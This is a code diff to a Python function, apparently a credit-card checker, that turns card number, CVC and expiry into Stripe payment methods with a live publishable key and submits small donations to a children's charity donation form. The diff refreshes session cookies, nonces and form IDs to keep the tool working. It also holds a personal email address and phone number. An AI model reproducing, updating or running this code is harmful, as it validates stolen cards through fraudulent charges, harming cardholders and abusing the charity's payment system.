@@ -38,7 +38,8 @@ def Tele(ccx):
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
 	r = requests.session()
-	
+
+
 	headers = {
             'authority': 'api.stripe.com',
             'accept': 'application/json',
@@ -55,7 +56,7 @@ def Tele(ccx):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 	}
 
-	data = f'type=card&billing_details[name]=Vhhjj+nge&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=819010f5-beed-4d24-8802-e7f4b3cd8abe373ecf&payment_user_agent=stripe.js%2F08a843aa09%3B+stripe-js-v3%2F08a843aa09%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=46616&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
+	data = f'type=card&billing_details[name]=Vhhjj+nge&billing_details[email]=saimyataungcr8%40gmail.com&billing_details[address][city]=New+York+&billing_details[address][country]=US&billing_details[address][line1]=New+York&billing_details[address][postal_code]=10080&billing_details[address][state]=New+York&billing_details[phone]=15025659429&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=7d5426db-2192-4323-9eeb-146aa8676b4d905708&sid=450dde21-df2a-4445-9015-6b4f1014ede65f3aac&payment_user_agent=stripe.js%2F89f50b7e22%3B+stripe-js-v3%2F89f50b7e22%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=51460&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 
 	pm = r1.json()['id']
@@ -64,10 +65,10 @@ def Tele(ccx):
 	cookies = {
             '_ga': 'GA1.1.1027315439.1730043864',
             '__stripe_mid': '7d5426db-2192-4323-9eeb-146aa8676b4d905708',
-            'charitable_session': '9848ebbf9201820410346a12a53ee706||86400||82800',
-            '__stripe_sid': '819010f5-beed-4d24-8802-e7f4b3cd8abe373ecf',
-            '_ga_M3WG7TPY0P': 'GS1.1.1730306926.9.1.1730306949.0.0.0',
-            '_ga_9S894YGECP': 'GS1.1.1730306926.9.1.1730306952.0.0.0',
+            'charitable_session': '70109c66237872fdeb294b680424a071||86400||82800',
+            '_ga_M3WG7TPY0P': 'GS1.1.1730432773.11.1.1730432781.0.0.0',
+            '__stripe_sid': '450dde21-df2a-4445-9015-6b4f1014ede65f3aac',
+            '_ga_9S894YGECP': 'GS1.1.1730432772.11.1.1730432806.0.0.0',
 	}
 
 	headers = {
@@ -75,7 +76,7 @@ def Tele(ccx):
             'accept': 'application/json, text/javascript, */*; q=0.01',
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            # 'cookie': '_ga=GA1.1.1027315439.1730043864; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; charitable_session=9848ebbf9201820410346a12a53ee706||86400||82800; __stripe_sid=819010f5-beed-4d24-8802-e7f4b3cd8abe373ecf; _ga_M3WG7TPY0P=GS1.1.1730306926.9.1.1730306949.0.0.0; _ga_9S894YGECP=GS1.1.1730306926.9.1.1730306952.0.0.0',
+            # 'cookie': '_ga=GA1.1.1027315439.1730043864; __stripe_mid=7d5426db-2192-4323-9eeb-146aa8676b4d905708; charitable_session=70109c66237872fdeb294b680424a071||86400||82800; _ga_M3WG7TPY0P=GS1.1.1730432773.11.1.1730432781.0.0.0; __stripe_sid=450dde21-df2a-4445-9015-6b4f1014ede65f3aac; _ga_9S894YGECP=GS1.1.1730432772.11.1.1730432806.0.0.0',
             'origin': 'https://needhelped.com',
             'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
@@ -90,9 +91,9 @@ def Tele(ccx):
 
 
 	data = {
-            'charitable_form_id': '67226384620ca',
-            '67226384620ca': '',
-            '_charitable_donation_nonce': '445971bdfb',
+            'charitable_form_id': '67244f0bd214c',
+            '67244f0bd214c': '',
+            '_charitable_donation_nonce': 'b68114877f',
             '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
             'campaign_id': '1164',
             'description': 'Poor Children Donation Support',
@@ -126,6 +127,9 @@ def Tele(ccx):
 	except:
 		return 'success' or 'Thank You'
 	return ii
+	
+	
+	
 	
 	
 	
